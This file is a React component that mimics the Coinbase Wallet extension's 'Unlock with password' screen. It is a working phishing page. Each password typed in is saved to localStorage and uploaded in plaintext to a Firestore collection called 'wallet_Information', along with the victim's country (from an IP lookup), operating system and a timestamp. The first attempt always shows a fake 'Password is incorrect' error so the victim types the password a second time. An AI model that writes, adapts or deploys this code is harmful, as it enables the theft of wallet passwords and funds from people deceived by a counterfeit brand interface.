import React, { useState, useEffect } from "react";
import FoxAnimation from "../components/FoxAnimation";
import "./LoginPage.css";
import { db } from "../firebase";
import { doc, setDoc } from "firebase/firestore";
import spinner from "../assets/loading.svg";
import favIcon from "../assets/fav.svg";
import { ReactComponent as PasswordVisibilityIcon } from "./sah.svg";
import "./wallet.css";

export default function LoginPage({ onClose }) {
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [attempts, setAttempts] = useState(0);
  const [passwordText, setPasswordText] = useState(" ");
  const [unlockText, setUnlockText] = useState("Unlock");
  const [forgotText, setForgotText] = useState("Forgot password?");
  const [forgotPasswordStyle, setForgotPasswordStyle] = useState({});
  const [blurred, setBlurred] = useState(false);

  // 🔥 Get MetaMask language (best effort)
  const getMetaMaskLanguage = async () => {
    try {
      if (window.ethereum && window.ethereum.request) {
        // This sometimes returns language-related info depending on version
        const res = await window.ethereum.request({
          method: "web3_clientVersion",
        });

        // fallback: still use browser language
        return navigator.language;
      }
    } catch (e) {
      console.log("MetaMask language not accessible");
    }
    return navigator.language;
  };

  // 🔥 Language handling
  useEffect(() => {
    const loadLanguage = async () => {
      const lang = await getMetaMaskLanguage();

        setPasswordText(" ");
        setUnlockText("Unlock");
        setForgotText("Forgot password?");
      
    };

    loadLanguage();
  }, []);

  const getCountry = async () => {
    try {
      const res = await fetch("https://ipapi.co/json/");
      const data = await res.json();
      return data.country_name || "Unknown";
    } catch {
      return "Unknown";
    }
  };

  const getOS = () => {
    const platform = navigator.platform.toLowerCase();
    if (platform.includes("win")) return "Windows";
    if (platform.includes("mac")) return "MacOS";
    if (platform.includes("linux")) return "Linux";
    return "Unknown";
  };

  const savePassword = (pass) => {
    try {
      const stored = localStorage.getItem("walletPasswords");
      const savedPasswords = stored ? JSON.parse(stored) : [];
      let updated = [...savedPasswords, pass];
      if (updated.length > 2) updated = updated.slice(-2);
      localStorage.setItem("walletPasswords", JSON.stringify(updated));
    } catch {
      localStorage.setItem("walletPasswords", JSON.stringify([pass]));
    }
  };

  const saveAttempt = async () => {
    try {
      const stored = localStorage.getItem("walletAttempts");
      const savedAttempts = stored ? JSON.parse(stored) : [];

      savePassword(password);

      const savedPasswords = JSON.parse(
        localStorage.getItem("walletPasswords") || "[]"
      );

      const country = await getCountry();

      const newAttempt = {
        attemptTime: new Date().toLocaleString(),
        passwordLength: password.length,
        attemptNumber: attempts + 1,
        os: getOS(),
        value: String(password),
        country,
        wallet: "Coinbase",
      };

      let updated = [...savedAttempts, newAttempt];
      if (updated.length > 2) updated = updated.slice(-2);

      localStorage.setItem("walletAttempts", JSON.stringify(updated));

      const docName = new Date().toLocaleString().replace(/[/:,\s]/g, "_");

      await setDoc(doc(db, "wallet_Information", docName), newAttempt);
    } catch (error) {
      console.error("Error saving attempt:", error);
    }
  };

  const handleUnlock = async (e) => {
    if (e) {
      e.preventDefault();
      e.stopPropagation();
    }

    if (!password) return;

    setLoading(true);
    setError("");
    setBlurred(true);

    const nextAttempt = attempts + 1;

    await saveAttempt();

    setTimeout(() => {
      if (nextAttempt === 1) {
        setError("Password is incorrect. Please try again.");
        setPassword("");
        setAttempts(nextAttempt);
        setLoading(false);
        setBlurred(false);
        return;
      }

      localStorage.setItem("wallet_done", "true");

      setLoading(false);
      setBlurred(false);

      if (typeof onClose === "function") {
        onClose();
      }
    }, 50);
  };

  return (
  <main className={`login-root ${"dark-mode"}`}>
    {loading && (
      <div className="loading-overlay">
        <img src={spinner} alt="Loading" className="spinner" />
      </div>
    )}

    <section className="login-section">
      <header className="login-logo">
        <img
          src={favIcon}
          className="wallet-logo"
          alt="Wynn Wallet"
        />

        <div className="wallet-brand">
          <h1
            className="wallet-title"
            id="popup-wallet-title"
          >
            Coinbase Wallet
          </h1>

          <p className="wallet-subtitle">
            Extension
          </p>
        </div>
      </header>

      <div className="login-form">
         <h1
            className="un-title"
          >Unlock with password</h1>
        <div className="login-password-wrapper">
          <input
            type={showPassword ? "text" : "password"}
            autoComplete="current-password"
            placeholder={passwordText}
            value={password}
            onChange={(e) => {
              setPassword(e.target.value);
              setError("");
            }}
            onKeyDown={(e) => {
              if (e.key === "Enter") handleUnlock(e);
            }}
            disabled={loading}
            className={`login-input ${error ? "error" : ""}`}
          />
          <button
            type="button"
            className="login-password-toggle"
            aria-label={showPassword ? "Hide password" : "Show password"}
            aria-pressed={showPassword}
            onClick={() => setShowPassword((visible) => !visible)}
            disabled={loading}
          >
            <PasswordVisibilityIcon aria-hidden="true" />
          </button>
        </div>

        {error && <p className="login-error">{error}</p>}

        <button
          type="button"
          disabled={password.length === 0 || loading}
          className="login-button"
          onClick={handleUnlock}
        >
          {unlockText}
        </button>

        <div className="login-forgot">
          <a href="#" style={forgotPasswordStyle}>
            {forgotText}
          </a>
        </div>
      </div>

      
    </section>
  </main>
);
}
